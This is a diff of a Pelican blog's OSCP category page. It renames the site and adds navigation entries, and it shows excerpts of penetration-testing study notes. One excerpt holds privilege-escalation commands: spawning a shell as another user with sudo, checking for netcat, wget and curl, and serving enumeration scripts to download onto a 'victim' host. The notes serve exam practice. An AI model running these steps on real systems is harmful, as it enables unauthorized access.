@@ -3,26 +3,29 @@
 <head>
         <meta charset="utf-8" />
         <meta name="generator" content="Pelican" />
-        <title>Daniel Haggerty's Blog - OSCP</title>
+        <title>Digital Forensics - OSCP</title>
         <link rel="stylesheet" href="/theme/css/main.css" />
-        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daniel Haggerty's Blog Atom Feed" />
-        <link href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate" title="Daniel Haggerty's Blog RSS Feed" />
+        <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Digital Forensics Atom Feed" />
 </head>
 
 <body id="index" class="home">
         <header id="banner" class="body">
-                <h1><a href="/">Daniel Haggerty's Blog</a></h1>
+                <h1><a href="/">Digital Forensics</a></h1>
                 <nav><ul>
-                    <li><a href="/category/dfir.html">DFIR</a></li>
+                    <li><a href="/category/analysis.html">Analysis</a></li>
+                    <li><a href="/category/android.html">Android</a></li>
                     <li><a href="/category/docker.html">Docker</a></li>
+                    <li><a href="/category/iphone.html">iPhone</a></li>
+                    <li><a href="/category/mac.html">Mac</a></li>
                     <li><a href="/category/network.html">Network+</a></li>
                     <li class="active"><a href="/category/oscp.html">OSCP</a></li>
+                    <li><a href="/category/windows.html">Windows</a></li>
                 </ul></nav>
         </header><!-- /#banner -->
 
             <aside id="featured" class="body">
                 <article>
-                    <h1 class="entry-title"><a href="/linux-privilege-escalation.html">"Linux Privilege Escalation"</a></h1>
+                    <h1 class="entry-title"><a href="/linux-privilege-escalation.html">Linux Privilege Escalation</a></h1>
 <footer class="post-info">
         <abbr class="published" title="2019-11-01T00:00:00-05:00">
                 Published: Fri 01 November 2019
@@ -54,9 +57,11 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)</p>
-<p><code>sudo -u anotheruser command run sommand as another user
-sudo -u scriptmanager bash -i #run shell as user scriptmanager
-which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&gt;/dev/null</code></p>
+<div class="highlight"><pre><span></span><code><span class="err">sudo -u anotheruser command run sommand as another user</span>
+<span class="err">sudo -u scriptmanager bash -i #run shell as user scriptmanager</span>
+<span class="err">which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&gt;/dev/null</span>
+</code></pre></div>
+
 <p>DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
@@ -176,7 +181,7 @@ CAP_DAC_READ_SEARCH
             <li><article class="hentry">
                 <header>
                     <h1><a href="/windows-privilege-escalation.html" rel="bookmark"
-                           title="Permalink to "Windows Privilege Escalation"">"Windows Privilege Escalation"</a></h1>
+                           title="Permalink to Windows Privilege Escalation">Windows Privilege Escalation</a></h1>
                 </header>
 
                 <div class="entry-content">
@@ -210,7 +215,7 @@ Use pyinstaller on dev windows machine …</p>
             <li><article class="hentry">
                 <header>
                     <h1><a href="/linux-buffer-overflow.html" rel="bookmark"
-                           title="Permalink to "Linux Buffer Overflow"">"Linux Buffer Overflow"</a></h1>
+                           title="Permalink to Linux Buffer Overflow">Linux Buffer Overflow</a></h1>
                 </header>
 
                 <div class="entry-content">
@@ -237,7 +242,7 @@ iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j …</p>
             <li><article class="hentry">
                 <header>
                     <h1><a href="/windows-buffer-overflow.html" rel="bookmark"
-                           title="Permalink to "Windows Buffer Overflow"">"Windows Buffer Overflow"</a></h1>
+                           title="Permalink to Windows Buffer Overflow">Windows Buffer Overflow</a></h1>
                 </header>
 
                 <div class="entry-content">
@@ -285,7 +290,7 @@ nmap -p- -oA …</code></pre></div>
             <li><article class="hentry">
                 <header>
                     <h1><a href="/passing-the-oscp.html" rel="bookmark"
-                           title="Permalink to "Passing the OSCP Exam: Trying Smarter"">"Passing the OSCP Exam: Trying Smarter"</a></h1>
+                           title="Permalink to Passing the OSCP Exam - Trying Smarter">Passing the OSCP Exam - Trying Smarter</a></h1>
                 </header>
 
                 <div class="entry-content">
@@ -310,21 +315,11 @@ nmap -p- -oA …</code></pre></div>
                 </ol><!-- /#posts-list -->
                 </section><!-- /#content -->
         <section id="extras" class="body">
-                <div class="blogroll">
-                        <h2>links</h2>
-                        <ul>
-                            <li><a href="https://getpelican.com/">Pelican</a></li>
-                            <li><a href="https://www.python.org/">Python.org</a></li>
-                            <li><a href="https://www.docker.com/">Docker</a></li>
-                        </ul>
-                </div><!-- /.blogroll -->
                 <div class="social">
                         <h2>social</h2>
                         <ul>
                             <li><a href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
-                            <li><a href="/feeds/all.rss.xml" type="application/rss+xml" rel="alternate">rss feed</a></li>
 
-                            <li><a href="#">Another social link</a></li>
                         </ul>
                 </div><!-- /.social -->
         </section><!-- /#extras -->
